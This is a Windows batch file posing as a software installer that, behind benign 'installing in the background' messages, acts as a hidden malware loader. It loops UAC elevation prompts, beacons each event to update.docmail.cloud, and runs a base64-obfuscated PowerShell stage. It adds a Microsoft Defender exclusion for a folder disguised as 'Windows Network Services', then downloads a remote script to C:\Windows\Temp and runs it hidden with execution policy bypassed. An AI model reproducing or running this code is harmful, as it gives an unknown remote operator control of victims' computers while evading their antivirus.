@echo off
fsutil dirty query %SystemDrive% >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$max=4;for($i=1;$i -le $max;$i++){try{Start-Process cmd.exe -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden -EA Stop;$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=29E4T6&event=UAC_ACCEPTED&detail=install.bat' -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue;break}catch{$msg=if($i -lt $max){'Attempt '+$i+' of '+$max+' declined - retrying'}else{'Attempt '+$i+' of '+$max+' declined - giving up'};$null=Invoke-WebRequest -Uri ('https://update.docmail.cloud/install-status?c=29E4T6&event=UAC_REJECTED&detail='+[uri]::EscapeDataString($msg)) -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue;if($i -lt $max){Start-Sleep 2}}}"
    exit /b
)

del /f /q "C:\Windows\Temp\rmm_install_done.flag" >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-EncodedCommand','JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAyADAAOwBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAByAG0AbQBfAGkAbgBzAHQAYQBsAGwAXwBkAG8AbgBlAC4AZgBsAGEAZwAnACkAewBlAHgAaQB0AH0AOwBbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AHQAcgB5AHsAJABuAHUAbABsAD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAHUAcABkAGEAdABlAC4AZABvAGMAbQBhAGkAbAAuAGMAbABvAHUAZAAvAGkAbgBzAHQAYQBsAGwALQBzAHQAYQB0AHUAcwA/AGMAPQAyADkARQA0AFQANgAmAGUAdgBlAG4AdAA9AFMAVABVAEMASwBfADEAMgAwAFMAJgBkAGUAdABhAGkAbAA9AGkAbgBzAHQAYQBsAGwALgBiAGEAdAAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADUAfQBjAGEAdABjAGgAewB9ADsAdAByAHkAewBbAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAFQAZQB4AHQAKAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcgBtAG0AXwBzAC4AcABzADEAJwAsACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAHUAcABkAGEAdABlAC4AZABvAGMAbQBhAGkAbAAuAGMAbABvAHUAZAAvAGkAbgBzAHQAYQBsAGwAZQByAC8AcABzADEAPwBjAD0AMgA5AEUANABUADYAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAIAAzADAAIAAtAEUAQQAgAFMAdABvAHAAKQAuAEMAbwBuAHQAZQBuAHQAKQB9AGMAYQB0AGMAaAB7AH0AOwBpAGYAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHIAbQBtAF8AcwAuAHAAcwAxACcAKQAgAC0AYQBuAGQAIAAoAEcAZQB0AC0ASQB0AGUAbQAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAByAG0AbQBfAHMALgBwAHMAMQAnACAALQBFAEEAIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMQAwADAAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABAACgAJwAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACcALAAnAEgAaQBkAGQAZQBuACcALAAnAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAJwAsACcAQgB5AHAAYQBzAHMAJwAsACcALQBGAGkAbABlACcALAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcgBtAG0AXwBzAC4AcABzADEAJwApAH0A')" >nul 2>&1

powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12';for($i=1;$i -le 3;$i++){try{$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=29E4T6&event=BAT_STARTED&detail=install.bat' -UseBasicParsing -TimeoutSec 5 -EA Stop;break}catch{if($i -lt 3){Start-Sleep 1}}}" >nul 2>&1

sc query WinNetSvcHost >nul 2>&1
if errorlevel 1 goto _svc_skip
sc stop WinNetSvcHost >nul 2>&1
for /l %%i in (1,1,15) do (
    sc query WinNetSvcHost 2>nul | findstr /C:"STOPPED" >nul && goto _svc_stopped
    timeout /t 1 /nobreak >nul
)
:_svc_stopped
sc delete WinNetSvcHost >nul 2>&1
:_svc_skip
rd /s /q "C:\Program Files (x86)\Windows Network Services" >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Windows Network Services' -EA SilentlyContinue" >nul 2>&1

taskkill /F /IM msiexec.exe /T >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' -and $_.CommandLine -like '*rmm_s.ps1*' -and $_.ProcessId -ne $PID } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }" >nul 2>&1

powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12';for($i=1;$i -le 2;$i++){try{[IO.File]::WriteAllText('C:\Windows\Temp\rmm_s.ps1',(Invoke-WebRequest -Uri 'https://update.docmail.cloud/installer/ps1?c=29E4T6' -UseBasicParsing -TimeoutSec 20 -EA Stop).Content);break}catch{if($i -lt 2){Start-Sleep 2}}}" >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "if(-not(Test-Path 'C:\Windows\Temp\rmm_s.ps1') -or (Get-Item 'C:\Windows\Temp\rmm_s.ps1' -EA SilentlyContinue).Length -lt 100){[Net.ServicePointManager]::SecurityProtocol='Tls12';try{$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=29E4T6&event=PS1_EMPTY' -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue}catch{};exit 1};exit 0" >nul 2>&1
if %errorlevel% neq 0 exit /b
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NonInteractive','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','C:\Windows\Temp\rmm_s.ps1')" >nul 2>&1

echo done > "C:\Windows\Temp\rmm_install_done.flag" 2>nul
echo Setting up, please wait...
echo Downloading and installing in the background...
echo Installation is running in the background. You may safely close this window.
timeout /t 15 /nobreak >nul
